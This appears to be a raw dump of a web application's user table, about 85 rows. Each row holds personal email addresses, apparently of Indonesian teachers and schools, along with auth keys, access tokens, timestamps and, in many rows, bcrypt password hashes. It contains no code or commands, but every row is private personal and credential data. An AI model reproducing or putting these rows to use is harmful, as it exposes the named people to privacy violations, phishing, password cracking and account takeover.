| 1358 | NULL                 | purwahihermin@gmail.com                              | 1        | BPX6zWUW78i1FB28kONxPLxDj3RoSupU | setyowatipurwani69@gmail.com     | 1670031884 | 1629954520 | 1670031882 | fvtcfOOGcjSDfM6BV3UOCLIfwEHyvyXGPrfQ8ywQ | NULL         | $2y$13$CpZCwLLpiGdwxHdL1tkpqu1Ozzfgug.9JJltxSpQDZJ0AQago9nO. |
| 1359 | NULL                 | mariagoriti75@gmail.com                              | 2        | Dbz2rvMpYi28Y0C2v9Wo5Ynu0hfR1ibT | maria.goriti@gmail.com           | 1629966196 | 1629954525 | 1629966196 | zYJeXoUUqI9hdhaitZe4GfIQqZEZrQNiqldPlJpu | NULL         | <blank>                                                      |
| 1360 | NULL                 | ernawatispd976@gmail.com                             | 2        | UJ5s6MCLDPa4fEVOmY70eqBiKtIF850W | ernawatispd976@gmail.com         | 1630295503 | 1629954544 | 1630295502 | nQYkRjl9ZXZDfWF9zgYQ7kDq2nLnXp5LIWrCgRaS | NULL         | <blank>                                                      |
| 1361 | NULL                 | magaina@yahoo.com                                    | 1        | NvmrSoPciuSsl3l6ykFEM4evodU0F8kp | imeldaina.maga70@gmail.com       | 1707278371 | 1629954570 | 1707278370 | 66WFpkT3adaB2WGD5q9KnE9atx8FnKs8zsfLs2Zo | NULL         | $2y$13$5ShPqEP1RLgKa8uvjZKmluAr6WB8OelZ3HYRHWKvS1jaITvm/SS7S |
| 1362 | NULL                 | dwinartati1203@gmail.com                             | 1        | zAwf0zMb8C54FBk3KFctN5FVeJqE6yOU | dwinartati1203@gmail.com         | 1702729329 | 1629954598 | 1702530262 | MNJrqt2Or4QDc34wckpKgcI1q9cG1arHNsX2tSIZ | NULL         | $2y$13$95OE5ce5UdYOyPlplERbM.UwF/Ty9wBSlG/Lga4TdbwHZCJYb6C4G |
| 1363 | NULL                 | janahsusi@gmail.com                                  | 2        | zsjDgKMAHbR54cdXEp1aVvpxf4NQH7Gu | apriliantn@gmail.com             | 1629954680 | 1629954676 | 1629954676 | 27kWKpVxnwrpuioAmUzJZ02TIn7tBZL07aOT6mYp | NULL         | <blank>                                                      |
| 1364 | NULL                 | penerbitlenteraabadi.233f@gmail.com                  | 2        | 56pOQt8KC2Oc6u9y_jc6ldTGHxwo7Kzr | penerbitlenteraabadi.233f@gmail. | NULL       | 1629954682 | 1629954682 | W3-XgP5mYFE6plkEDCrDn1Q9PU0ZhW8PGIs-TIs- | NULL         | $2y$13$bTxid48YW0/c8AKYjerMGez5uCqOV2489zxndZ8VTnx3/4.Hpimei |
| 1365 | NULL                 | aandarlisazwar13@gmai.com                            | 2        | 88LEUCI0H7qICKLD1wjsxTVB2IbeMPpe | aandarlisazwar13@gmail.com       | 1630826376 | 1629954705 | 1630826376 | IELrTxnJLmy2lmBlBGQtrhqaSyscc1ljGcu0hykA | NULL         | <blank>                                                      |
| 1366 | NULL                 | masgurujoko@gmail.com                                | 1        | XAvKQ7dNwljK1LNVC1W4I3Fq8RUMF1Sa | masgurujoko@gmail.com            | 1630384001 | 1629954707 | 1630384001 | mSIymYF4h427Kp2FkFcX9qjMsNLhV9isgXvJ4Gyo | NULL         | <blank>                                                      |
| 1367 | NULL                 | yusuf.mursalin677@gmail.com                          | 1        | YVzwpoBzdPyGHUZVLHqgyaxoAV0MW5tt | yusuf.mursalim677@gmail.com      | 1718878041 | 1629954775 | 1718878039 | os55Cs4zScTLQMXrub1PkwXDisRzhqDhIoeaEj4W | NULL         | $2y$13$GqCoV45YtkqxHed8XgW0Ceecr4dvVg1Y7B9Fa4GajdNTlSnLoDUCG |
| 1368 | NULL                 | marzukigeguntur@gmail.com                            | 1        | YTv7s4gDHtk4zuLKuBB0MZJnoIQzh10G | marzukigeguntur@gmail.com        | 1630286047 | 1629954875 | 1630286047 | ESBpW2mFnK2KETSO4TLC2neiiA83iAgWHJVJJgKg | NULL         | <blank>                                                      |
| 1369 | NULL                 | sitti.jaurah61@gmail.com                             | 1        | uGpsCUP6AC2y1I62lmjkjLzyuo5JcZju | sitti.jaurah61@gmail.com         | 1632304752 | 1629954953 | 1632304752 | 3xWDJvZbZNbZvSpWOHD0CAAkWkJlL1dqoIxqRXuY | NULL         | <blank>                                                      |
| 1370 | NULL                 | marwiyah076@gmail.com                                | 1        | nZGgiWGhvOqFisny6bVkpIr4kQU4KrPw | marwiyah076@gmail.com            | 1718155889 | 1629954953 | 1718155885 | Xh0uM06Qs0DjsQtMp2ELjjs6lC721Zaxy6lIXD7r | NULL         | $2y$13$mo3paBIrw6FR7oo1KHeEYuF/7yeqEiOfKIlpk4iR1gaFxqy8FnaR6 |
| 1371 | NULL                 | yosiaskaitu168@gmail.com                             | 1        | OzYtC1TTqWNg1JxXZqoNtMNpaJXQeCvy | yosiaskaitu168@gmail.com         | 1698650896 | 1629955065 | 1698650894 | qxVaPMTF7dTpxarjDKZrQmrWSi7ptZpv9IpX7MD0 | NULL         | $2y$13$0LZCUkxCYnLkUcZxGKAPTOA4t/spjgCsZgMT.CDadJ8zQ0rYNJBJO |
| 1372 | NULL                 | misransdnmekarpura@gmail.com                         | 2        | fBTXMGVkleGPXYw6UM1mcbIX4fEgDtJn | misranlestari69@gmail.com        | 1675302297 | 1629955075 | 1675302295 | ntinX6Yx9WZ50rkc9bl90yHmS33raZy4VhGSxmMK | NULL         | $2y$13$g/zWsWpXic2IGaLk4V2.B.YjmYrARN75sMOF0EyTOe7nYffN.1eVC |
| 1373 | NULL                 | inung030584@gmail.com                                | 1        | kZv9reW05NePm6uUO3shg7v9TXYNJDn6 | srimulyati84a@gmail.com          | 1695691026 | 1629955136 | 1695691024 | B1ftVT1n1nYTcE6w7chObCeXRbeYPthyfBpjtbc2 | NULL         | $2y$13$z0K/c6H.jgp/7PkuKiHhz.NLSx.0UZWqZXkeASMoBfNJKUaxiISi6 |
| 1374 | NULL                 | keliksuherli94@gmail.com                             | 2        | 35mpyOiKs0vtxi4KJblEhY3tkxqzlSm1 | keliksuherli94@gmail.com         | 1686804447 | 1629955274 | 1686804445 | Gjnsk4FTUPf5TtpqkSZX9mIlT33DmsadHLl8onoN | NULL         | $2y$13$AqHdvIIipIGAuAwRJ6oMueCS3JB5pDECd3VtaisTwFmUcf1DH7aiO |
| 1375 | NULL                 | pujiatiar@gmail.com                                  | 2        | NQiSrHpEGjbJ5mAC9oUyCGGRJzRwud3G | pujiatiar@gmail.com              | 1717469504 | 1629955305 | 1717038842 | cDhrZnNU0mdNrwdYy8lKqvAw0DcaLzjV9JlgNj3z | NULL         | $2y$13$8IqrUkSzx.JQTjzR9dWy7OEmDzOq/5NJ.xui3R6hEPWCSBDtp410a |
| 1376 | NULL                 | endanggopur@yahoo.com                                | 1        | LhmdgrDkz2mMegmuZ5RROd7wThmrrIAM | endanggopur@yahoo.com            | 1631603745 | 1629955368 | 1631603745 | 5lXV05swC14WFp9V0i5EhvFqTqqiGmBQKZllvtga | NULL         | <blank>                                                      |
| 1377 | NULL                 | ismarfiah@gmail.com                                  | 2        | 9mMcvR1hHp2NNyjOxJffZqxJ5X7KSW9G | ismarfiah@gmail.com              | 1641518042 | 1629955426 | 1641518041 | 2yzOR0DsRggenbjWfWocPRwRtmfGpeSULiogY09Q | NULL         | <blank>                                                      |
| 1378 | NULL                 | wasiahbu@gmail.com                                   | 1        | iVCqkLl1HhpE8rWJv8yUpkaUEVyvfpo4 | wasiahbu@gmail.com               | 1632356571 | 1629955543 | 1632356571 | 3T23IKwuWX3xEhtT1XMd17Caxuk17DS3f2WfVdiD | NULL         | <blank>                                                      |
| 1379 | NULL                 | sudarmoadi@ymail.com                                 | 2        | tj5pYbWUtdFMmzxIJg5L5YK6KIC2mrnc | budisiswoyo10@yahoo.com          | 1630124781 | 1629955551 | 1630124780 | Y2mfCLjdvzCbvqJYvbFrnP7wqieeIA2sx4cRtnIq | NULL         | <blank>                                                      |
| 1380 | NULL                 | sarjanapwsdpetoyan1@gmail.com                        | 1        | rW5g8hdroSK8bzbShRPgu23V1hp0SXsr | sarjanapwsdpetoyan1@gmail.com    | 1634623137 | 1629955572 | 1634623137 | B9Uejj9bZq0yYhr4riUhU8cz8XjcsKpoypyF42kv | NULL         | <blank>                                                      |
| 1381 | NULL                 | srirahayularas@gmail.com                             | 1        | oHdW6qbmSpmH2UiOFnXxAzOmc9NSYbOB | srirahayularas@gmail.com         | 1634275995 | 1629955577 | 1634275995 | lveLgQKg5pWg6LNB47V6TeXuTDWudx4wtgEAIuzu | NULL         | <blank>                                                      |
| 1382 | NULL                 | rinirini920@yahoo.co.id                              | 2        | iiz0NPwV6ggmryPCQwEEhsorl80oF9YX | slamet.smpn2baradatu@gmail.com   | 1654659257 | 1629955653 | 1654659255 | RU5pixvX8SmAafTCVs1ycOM1mjRyo5xSE4wx1hye | NULL         | <blank>                                                      |
| 1383 | NULL                 | wariasih64@gmail.com                                 | 2        | PlR34nw8GKIS8p8mB8OsdRYToQXaoDAq | wariasih64@gmail.com             | 1638332341 | 1629955734 | 1638332339 | jnfReFZXBJJzbCpBFZywhmy6QVVVcCljiiiyO99n | NULL         | <blank>                                                      |
| 1384 | NULL                 | mastarinahmiing@yahoo.co.id                          | 1        | HgcZM4CTeOQ50gIHsmkfjOrz6CJ2YHsk | mastarinah17@gmail.com           | 1696341187 | 1629955910 | 1696341185 | UrIpipvwXXomrFyvxRYv2nwHVfJaNvgw6R8pwDsI | NULL         | $2y$13$d7oo0BJ3rASJ63UftZuZeuln1t6mQysiN65d4MyROl0sbW1vUkCCO |
| 1385 | NULL                 | yulianedo7@gmail.com                                 | 1        | i8CTgzlNNEQpqu2krXYoPv5o2bCaPe2A | yulian061967@gmail.com           | 1633400008 | 1629956052 | 1633400007 | XXdgOmSMcPWwdJqSiDOXeyaLCVkDLJ1CdJYwl1au | NULL         | <blank>                                                      |
| 1386 | NULL                 | marsono.001@gmail.com                                | 1        | QGX7QBePZo3OyTveR2MEdsRHQFDRuEoB | marsono.001@gmail.com            | 1630901918 | 1629956131 | 1630901918 | j11rQnViiA1i79BKhLfZMOoyQqg5hzAzyQcLpN8a | NULL         | <blank>                                                      |
| 1387 | NULL                 | usep.fauzi@yahoo.com                                 | 1        | AdDUHjZqnRCSRM8XhfZhLKzqlhyiOE6C | rismawanadinagoro@gmail.com      | 1665624323 | 1629956154 | 1665624322 | fhyw9nQg2uj52woJ26Ti9AlGCwPCCEhxeKtwaQZS | NULL         | <blank>                                                      |
| 1388 | NULL                 | Rumiasih_r@yahoo.co.id                               | 2        | PAS8droznHS3rUnyQnljd3d6K5FES9sR | misrumiasih@gmail.com            | 1642653764 | 1629956223 | 1642653764 | 2lVEWcSNjUyZGfvM7b4Rk1NceDojHPpeauMIIZq7 | NULL         | <blank>                                                      |
| 1389 | NULL                 | kasinahayu@gmail.com                                 | 1        | fBvb7w7M5VPNnFetsB1l5MvEcWmdkytZ | kasinahayu@gmail.com             | 1661563331 | 1629956300 | 1661563331 | WA0L2mlfelvd2rZpgxo1hW0YMvDoP0RgyDyrNT70 | NULL         | <blank>                                                      |
| 1390 | NULL                 | ismukti.wahyudi@gmail.com                            | 1        | hYp8BP8k88x4zjaf9vesG5pQgTYhUhQq | ismukti.wahyudi@gmail.com        | 1667456353 | 1629956376 | 1667456351 | CVQ8Mg40IsLRzcyKiOBjB2dPmB9npMFKIqSmHz2W | NULL         | $2y$13$PrKq2KeU1OAaKVkQ5m9MgOr7.8q1a1OuNiUMNw7dp3W5Jtz7lAjmG |
| 1391 | NULL                 | restumilda@yahoo.co.id                               | 1        | peGs05xcAwN3NCTMiLaVW0SXRYGYGgPF | restumilda57@gmail.com           | 1703752184 | 1629956380 | 1703748299 | Kj07jana8EmsShOzNt51hmGXae5zGmSZuQLlAqAY | NULL         | $2y$13$Ub5ORea2oMgcjqejHjhNVuObQW7AhZVTSJGGD6cndi5VkrwjPoEcW |
| 1392 | NULL                 | ansariansori14@gmail.com                             | 1        | JmPNL3UuznpDaSX7Z4oq1365eP5mhfnE | ansarismanalas@gmail.com         | 1663844568 | 1629956473 | 1663844567 | f17jFgKvY6QkAPaD6pWVgJSLwvCVNAy3BAHbz2gj | NULL         | <blank>                                                      |
| 1393 | NULL                 | qahnazuaf@gmail.com                                  | 1        | EZR5ULSmpd6J7yPZmBueny2mMgPA5TAQ | matematika3sma@gmail.com         | 1715067365 | 1629956483 | 1715067363 | pzkgOwpbaKdUASSoCWL6WJRunOuXE5EaIWv7XBJa | NULL         | $2y$13$brip/4OJUR74MH.fR0WxUe8hpx.5g3ljOpsxz9QfcH70e1ukP99NC |
| 1394 | NULL                 | aniksrirahayu9@gmail.com                             | 1        | QSOa9d8tKESIyiFwfJWlsQlVVODmZuLj | Aniksrirahayu1475@gmail.com      | 1698363027 | 1629956492 | 1698363025 | bcIpYGMnzgVrFwREvhYR1PH22LgWCsj0lnJEYHsQ | NULL         | $2y$13$mmV3jhVP4VAeJs8zbAxWSuCK8mQoIrNYUugtMmUX/X/4OjQ7sXAcq |
| 1395 | NULL                 | dnegart@yahoo.com                                    | 2        | SHe5J2qK3AobC9tfAwolaraO0hznytb8 | dnegart@yahoo.com                | 1686600091 | 1629956586 | 1686600089 | ntqTBuJMv0nIo2ZtMO5W5kNLw2HQWfDtVcaibTor | NULL         | $2y$13$VkI13q6YrOcBmQQsAzucS.Kv.B12qEndg5/baXoMNe68uHyBUyp1i |
| 1396 | NULL                 | bundasaidatun@gmail.com                              | 2        | VoJKMXAPvCqvYbBiP8MLfVBD7IMdWkqA | saidatunsyabibah123@gmail.com    | 1632294465 | 1629956619 | 1632294464 | irvzbJDfkPZEIlKhWnWIhrJns5JWgN9KnfjCEMVn | NULL         | <blank>                                                      |
| 1397 | NULL                 | laili64kh@gmail.com                                  | 1        | YVdmoA6qfV2IwbN7wZD955Kfmvrmcr6r | laili64kh@gmail.com              | 1699667683 | 1629956687 | 1699667681 | AsVvZpW4v9AnqhinmzoYqyxCVEB42R78qdqgiRKc | NULL         | $2y$13$FVDA/fQPmom46FXfMZYPB.fY8NGAfv69mHQ8GzvDTd0KeY7vqn8Qe |
| 1398 | NULL                 | septitijo74@gmail.com                                | 1        | oq2EBeJg9q3FRiABKr2JER8EIN2D1U43 | sugiarto090679@gmail.com         | 1650079722 | 1629956708 | 1650079722 | pjaINWOADZASLUqXqKgKkPz7v5iPVrjjYUj5Szx7 | NULL         | <blank>                                                      |
| 1399 | NULL                 | arow.sungkono@gmail.com                              | 2        | pAuvr9Z8LgRMgZ5hFYp5sHbMiAyyzs0K | arow.sungkono@gmail.com          | 1692678126 | 1629956741 | 1692678124 | ijhE9tMWn68i1JpP2DVShgnAKPOP4XRO3Sfef5Cz | NULL         | $2y$13$NlAFVXP833ONh.T7N1uzmubv2GsiXMfhp/OXUVJsHKEyYcaTclrUe |
| 1400 | NULL                 | alfian9595@gmail.com                                 | 1        | FxdDP7t2WhtVOVRUz66IlbGdZeGtX8qB | alfian9595@gmail.com             | 1702475587 | 1629956792 | 1702475586 | 3jbEVaCyTRaXeynXDff8s0scrjGO0MNQUvIv8ClR | NULL         | $2y$13$yfdsCVy9FFE6NO67w40AGeb79mujLqorsRy0ur.OTpPV8Rv0Do92m |
| 1401 | NULL                 | indahzaraqi89@gmail.com                              | 1        | 6upGYZdR7C3PealpnQir98IhIT9PdZuP | indahzaraqi89@gmail.com          | 1640336519 | 1629956806 | 1640336518 | mI0fj3zBcaEYcCfphxaxbopZBQzvkok55fXE1Fmu | NULL         | <blank>                                                      |
| 1402 | NULL                 | nurdiahsdpadangbaka@gmail.com                        | 2        | FsuV2hQQKvjs3sawbnGBikpxjHogNJiY | nurhidayahsd2@gmail.com          | 1719790675 | 1629956868 | 1719476015 | NmG9ESdGk3LH59LW6y4AlwKzWbECEIpVyOuNfZI6 | NULL         | $2y$13$Fu1.EQ9A8.Pfnvf4YWP2ReX.vJPjqEI9vCLQUQ0r5xIvWhZXJN/cu |
| 1403 | NULL                 | djaja.sinar@yahoo.com                                | 2        | CvPzlQqm9dZpDGxgS0q84vE48sbuIJJT | sinardjaja31@gmail.com           | 1631028985 | 1629956907 | 1631028984 | QnXcQDlDUP0ofTQO9qgz0HS3pPyegpcHlgXoBrxR | NULL         | <blank>                                                      |
| 1404 | NULL                 | djaja.sinar@yahoo.com                                | 2        | 8MuidPJzDvxP51OVk4ipQUPkLsctpfAZ | sinardjaja31@gmail.com           | 1629956907 | 1629956907 | 1629956907 | qSPcZpv1q9htuiPh26ec2tZp9JaLypVTdXSbeLgP | NULL         | <blank>                                                      |
| 1405 | NULL                 | arif.syukri.nasution@gmail.com                       | 2        | i9rU12M8223Aul0wJMGOSUKYcVsMEbA6 | arif.syukri.nasution@gmail.com   | 1684304022 | 1629957005 | 1684304021 | pZdgEJ1y0ImAJxQ7TmGDDKlVqX8ubpDk1Zt0gNZe | NULL         | $2y$13$er/f/IY2mzjG7lOMVvrace3lNN4fbOlkSVvRReFCpxNtc8r6bx15C |
| 1406 | NULL                 | sukamta371@gmail.com                                 | 2        | k23DUiKZuvFwYNmji8BAPdksxaGWHYNg | sukamta371@gmail.com             | 1721259400 | 1629957053 | 1720667394 | 2ittxo4nHERQMYenrndSB1ng99FkyHYz6L6hfTj4 | NULL         | $2y$13$foIbHpD6jND0CG6l5oHaIuYlROjPizIqb/A/dYIO82j4Q1oSSl7BC |
| 1407 | NULL                 | idamaherani64@gmail.com                              | 1        | 7rYZCrwrYHuexjQpYHuWZIWtfZH8JPAj | jumyanah@gmail.com               | 1717028758 | 1629957127 | 1717028754 | Ojiu3TM3fDWVmHkoCwRccuaclLsxHDDiOzPatcwt | NULL         | $2y$13$PYm1iA4Y4yGz6Kn9YpNFQurvelcZYgTDd8Xi3LDet4PwV8IPgQ8SS |
| 1408 | NULL                 | kristinfilianamaringga@yahoo.co.id                   | 2        | i4WTItBzgJcqhUJyyeBev7eh6WhraeQb | budigefriali@gmail.com           | 1641174000 | 1629957133 | 1641174000 | eLdlYOxseDWU3M6JsuG2G4d9JzAISmwbZ9S4eyEc | NULL         | <blank>                                                      |
| 1409 | NULL                 | anikyadi69@gmail.com                                 | 1        | GLrF8iGt97hvUs0579FCMHGFv1AjRXlv | anik14buntok@gmail.com           | 1711698200 | 1629957143 | 1711698199 | l0xywC805bgBhqH5iBJDqYns42hOC7ACihkYr4Mp | NULL         | $2y$13$Syss6bQW8BmeOoHOLL.YVu5K225Gd3FV8hWLCLstsAkOLdbK7EkIO |
| 1410 | NULL                 | mukhasanahraka@gmail.com                             | 1        | kv5GvJEw0cN5N9qiGb0olXgTquCeDfiH | mukhasanahraka@gmail.com         | 1634189062 | 1629957176 | 1634189061 | X863d9TCXd95YjgfYMTmkqu2d13dkXgrj05At8HJ | NULL         | <blank>                                                      |
| 1411 | NULL                 | ganovia2@yahoo.com                                   | 1        | VaLI0L1SbPeVSzM3Vpj9PesQZXnQATrt | ganovia2@yahoo.com               | 1719301909 | 1629957233 | 1717138088 | Mm7Cs6bpXadaebDLrR7uat0iOzBZTlfE6vZAIjGT | NULL         | $2y$13$l4sfcKKLavETufrH4XlT7Oaq65xVjxsDuflSO0iLP2KpNF2GxZ7qC |
| 1412 | NULL                 | susitrisni@gmail.com                                 | 1        | tKatsCyHbqveBiEzJDLH6D7BQsUB3Ln1 | susitrisni@gmail.com             | 1701677115 | 1629957378 | 1701677112 | IXqO1xUbgY7mWu54yy8TTY0JUpZ4HWhAyqBtKIhQ | NULL         | $2y$13$NhAK5JaesGi09AwRP7tVpuWZemgXHBQHvCl5YaQlkCTaMw9mPV632 |
| 1413 | NULL                 | azhari.azva81@gmail.com                              | 1        | QhUJ9PXQbkWrCwHv98nOGj76AVYyYgZB | azhari.azva81@gmail.com          | 1630976970 | 1629957392 | 1630976970 | R0YzEyoaHNVDp6GhlddBUVK1QTzjJJfALWmp3p7p | NULL         | <blank>                                                      |
| 1414 | NULL                 | rukmininussa@gmail.com                               | 1        | RCrN7zKEQMEeJxOjEDdEqBWrXS2FNUfM | rukmininussa@gmail.com           | 1693351513 | 1629957399 | 1693351511 | YriTn0GAoxJVOsdaJVG3hrrjspS9GhZiMD8PMKNv | NULL         | $2y$13$WQcmDvj/oL8WuQaBOUereejwiycmmSCN2lPQs6TSuS7AbfoRBGaJ6 |
| 1415 | NULL                 | sangsusila@gmail.com                                 | 2        | Nks1kpebHJzNQkMToPXg13fQVt9EHgfS | suartawangede12@gmail.com        | 1631318723 | 1629957442 | 1631318723 | KCztLdgFgkxb7eUC6sXWeYhVnUEU3oNlAPwaawDo | NULL         | <blank>                                                      |
| 1416 | NULL                 | sadiyemspd@gmail.com                                 | 1        | NGuUtFAOcFHdUkUfgy7iUpoVp4Nt28ws | sadiyemspd@gmail.com             | 1629957576 | 1629957465 | 1629957575 | szG6R7GXE5bHBVKzCiWwXOPUu3dZpvO3aGNbbr8j | NULL         | <blank>                                                      |
| 1417 | NULL                 | igustilanangweda@yahoo.co.id                         | 2        | 3eFs4SUU1jQOZmaP1MsOszkhlXRVyAuQ | sujana_203@yahoo.co.id           | 1630048962 | 1629957482 | 1630048962 | kw2aE5lomMPyEZgCD4XBsUSaZtlayR5BfOOiQbGi | NULL         | <blank>                                                      |
| 1418 | NULL                 | yulaikah@yahoo.co.id                                 | 1        | Whx28okLWemnT5cZaHgHXGUFz4ulOhjA | yulaikaheyang@gmail.com          | 1707708054 | 1629957487 | 1707708052 | qNahHJyxgsm4jtPZLKNd6v3Dmf4Sj2YRVRV6s3l2 | NULL         | $2y$13$tx35yMM0K2h5gph5TYj6SOlNrkE/VevQrNbh2qrHlsvUtJZMlvyIa |
| 1419 | NULL                 | sninahermina@gmail.com                               | 2        | YqJCAzcek6yxbmxpeAQjtSCA4W3QYCsb | sitininahermina7@gmail.com       | 1713259010 | 1629957491 | 1713259009 | ablUqO1FKH5UL88bRqOPiiy9CN3oOAOvmnDe4oE3 | NULL         | $2y$13$hFJyyyfANQLfgefP8Qhv2OT.XtXV3Xp2smrl/pexK532scaNy4dQi |
| 1420 | NULL                 | mikun004.ntx@gmail.com                               | 2        | rDQ8EIp8UHDP8ATKV5B5mXLfkpsYTrzq | muhammadsyukur.ntx@gmail.com     | 1671680308 | 1629957497 | 1671680307 | 69w5rrmQ8a3LljWFFS8iJ56Z5wnP3fcxMMIIYe5b | NULL         | $2y$13$n5RE46yU4zR4WnnPz98XiOwc8sDlVct05ONfNVjenHzApw0fXVd2e |
| 1421 | NULL                 | imaderaimudiartha@gmail.com                          | 1        | GI2bAi6OmwJCVud605rS1gQUvyDo6mUJ | inyoman.wardika@yahoo.co.id      | 1629962474 | 1629957526 | 1629962467 | tMjdWaslxeLr6qO7frNPFhq7CGOWcWEo6MZvz57y | NULL         | <blank>                                                      |
| 1422 | NULL                 | rojanahtegal@gmail.com                               | 1        | UpS7q9Pxiy1qqWiV8RdhibONuGDTVhiE | rojanahtegal@gmail.com           | 1632570540 | 1629957571 | 1632570540 | CVsfaEO6pgezzKkZEIa025pih768SKdmpaXomZRH | NULL         | <blank>                                                      |
| 1423 | NULL                 | mollasyamsiah@gmail.com                              | 1        | zuUU3D5dYmazQ2jl9GnVy2XETiqy7wcx | syamsiahmolla79@gmail.com        | 1631960695 | 1629957616 | 1631960695 | MOOpXunoAKZUIOfUHnNz4xaZ2ntfmNVFSHvAy9Oy | NULL         | <blank>                                                      |
| 1424 | NULL                 | suwardiberlina@yahoo.co.id                           | 1        | vv5Z2BUalDLBZu5BJv2CCIcQvIasIqL3 | devdanalvaro99@gmail.com         | 1629958355 | 1629957619 | 1629958352 | yAP80iTEsjeaeEHGMaOWlqKCR6TOEPpBiFX2ZEIK | NULL         | <blank>                                                      |
| 1425 | NULL                 | sendra.made@yahoo.co.id                              | 2        | GdteQ2iGXjd0M4pvOFVRxPSOU4OlEQ14 | rosself92@yahoo.co.id            | 1643429983 | 1629957821 | 1643429982 | j7794tpUjj06GcROuxRBXJQOX5QKUoqOSixmwsdZ | NULL         | <blank>                                                      |
| 1426 | NULL                 | musrokimspd@yahoo.com                                | 2        | GXc77sjpV7aepp3BMBFIedy5H5cEjEWI | musrokim67@gmail.com             | 1652490255 | 1629957861 | 1652490255 | mYRBTKM4bwfO2fIufLfxtcUcXg4lyZiEoRqsIixs | NULL         | <blank>                                                      |
| 1427 | NULL                 | norkamila262@gmail.com                               | 2        | 43X7xqIWwVIXguOaSp7P3hanlZDbIQC5 | norkamalia1977@gmail.com         | 1695081280 | 1629957883 | 1695081278 | VT7p3NGUQBWUlFjzXUZnqkrKLRWvngr8QYGACEZK | NULL         | $2y$13$aWNLL/VcOIZSLZzUtnkT0uGNkFKZObpe.tjGa0Pw43hGTk2wG5RHy |
| 1428 | NULL                 | mohsuib1234@gmail.com                                | 2        | xKwt5I5oSpNAMme3AfwvVSgLe9hhnDVN | mohsuib63@gmail.com              | 1640571168 | 1629957907 | 1640571166 | pOsn2KIq4Kn2TDrV6EQwT58CyvsLN8IygEtKqd7z | NULL         | <blank>                                                      |
| 1429 | NULL                 | srirahayuut2016@gmail.com                            | 1        | Coayz25T8oJpMvbwqxrD1AnfPB2qy1f1 | srirahayuut2016@gmail.com        | 1632448447 | 1629957994 | 1632448446 | FveFTTXKuEKoCCJ6pkE3OB50fu2sZ43lXGVZOKp0 | NULL         | <blank>                                                      |
| 1430 | NULL                 | sinarjuliartono68@gmail.com                          | 2        | KbSnK0kh9aTMQvCTZ4PW6vzrWjY4mL7P | sinarjuliartono68@gmail.com      | 1718163816 | 1629958024 | 1718076041 | lzjyiijzyz45uygeUPKp4jU3c0OKinfajOPbuQ2N | NULL         | $2y$13$RB9Kq95wi5AEv46qV8Gm5OawGJsU1RYMZao/6lhsHpZ9TQPIVYfWe |
| 1431 | NULL                 | jumailmail474@yahoo.com                              | 1        | Nz8n2dABxfqcJYFsJcgVIeeNVpIhJiEJ | jumailmail474@yahoo.com          | 1630399403 | 1629958099 | 1630399403 | ePVlhOnSYsa82QJhZBeeFC5lAK2oYbVIOyYgBA72 | NULL         | <blank>                                                      |
| 1432 | NULL                 | markeyyoup69@gmail.com                               | 1        | QlpfOCohRXe0ZgZ0kyf18dLVpKur7epm | bsmp034@gmail.com                | 1629958197 | 1629958196 | 1629958196 | PQTUHrwOo3sAOc1ahLAzjn6ozROHPKdtDqloqEej | NULL         | <blank>                                                      |
| 1433 | NULL                 | asihminarsih888@gmail.com                            | 1        | 97aOXpVl4TKPuNgCfd5UkSck5EGMDQ9W | asihminarsih888@gmail.com        | 1629958395 | 1629958369 | 1629958394 | A94o4dDLNBTgdUgVS4sWqOixn6me5Kvyky4BwKdz | NULL         | <blank>                                                      |
| 1434 | NULL                 | eerlianis@gmail.com                                  | 2        | 2Zf7iltVBTKmH61TEToD24KOIHWbmMI4 | erlianise@gmail.com              | 1721966245 | 1629958399 | 1721914130 | VgoyyqcG2eOI4iMuiXDtNuhfUqZ6bGYm1Ci7mPo8 | NULL         | $2y$13$XXscYYw3V5xDKaEDJTHT6uAM45uCGmfrU7edN/SobOVkcTGJwj4G2 |
| 1435 | NULL                 | abdurrahmanidrus601@gmail.com                        | 1        | 4sIRqfIOVQRzDsQslfztk071k551ZYO5 | abdurrahmanidrus601@gmail.com    | 1629958415 | 1629958414 | 1629958414 | qltCG8fzIlXxD4D6eB4hVoTai7nNK50oAj7iPSZ2 | NULL         | <blank>                                                      |
| 1436 | NULL                 | zul27her@yahoo.com                                   | 1        | gowmKxTBnev7XkYiPlWFS7fHSQnCQQpS | zahriaicbs1@gmail.com            | 1634779717 | 1629958484 | 1634779717 | I5W0EBVPYc4zdn5D8g9NkFmsOATRyCzBfgUj33SM | NULL         | <blank>                                                      |
| 1437 | NULL                 | ikasutrisna07@gmail.com                              | 2        | M4HkpPachPyAaWG9RxnVPQ2hyyrZK8QS | kbikasutrisna@gmail.com          | 1639570057 | 1629958515 | 1639570057 | RtFG47xIKJHm2XQ3KSlhNye3WsZldsfIPcdTg7Hr | NULL         | <blank>                                                      |
| 1438 | NULL                 | support@afirmasi.id                                  | 2        | Hs5wbrJs9-i2lGPP85KKl1jmF0GzI3Kv | support@afirmasi.id              | 1709275202 | 1629958552 | 1629958552 | 9Ti0uYvL-ew_WOoek6SD1kfKBD5DiRaz17FswlH3 | NULL         | $2y$13$P5USX8tI1gfwVyrYUdkSRe/mZMbI9FtBwe8/MGvYuXnzUf5of/2OG |
| 1439 | NULL                 | soniwuryanto67@gmail.com                             | 1        | CKVcgEBuo55SMz0jLjXoJe0WJwVkAxdT | soniwuryanto67@gmail.com         | 1691552435 | 1629958567 | 1691552433 | tStCfLwffO7eQDJDet2FECwQineSror19XCoXZkT | NULL         | $2y$13$AhszVUHeO3IPd8DO1U8oG.q3dpsa2nZwr6CkQNrvS9.xpRKl3KIiS |
| 1440 | NULL                 | elvi.zurianti@gmail.com                              | 2        | PIJ8yQg8WWdv8YjnnmCLaylBiFvjcmSI | elvizurianti.smanbinsus@gmail.co | 1629958647 | 1629958640 | 1629958640 | ikZZ35QwVNy5T7p7M8mqiRiGs2ZbAcmpDT8sAy83 | NULL         | <blank>                                                      |
| 1441 | NULL                 | elvi.zurianti@gmail.com                              | 1        | z6dCcFkDayt6MXpRZK5oMdWrqyTfzZIq | elvizurianti.smanbinsus@gmail.co | 1629958660 | 1629958653 | 1629958653 | UfcWKVCYkWTguC485IFE3f7d011TucQfBtTETi3e | NULL         | <blank>                                                      |
| 1442 | NULL                 | gustiayumadesuniati@gmail.com                        | 2        | HxKkpJm1uQwHUp6grovBwQF4Y19bYSJh | gustiayumadesuniati@gmail.com    | 1718803132 | 1629958713 | 1717502805 | lZxHswJSEfmwkYclAtp4bgFByUT7aBN9KiifnHOC | NULL         | $2y$13$ec.S3k8VBNN9okksLAXuyOU/whoty1GVxFfuX4fVYh/cqscI76ASG |
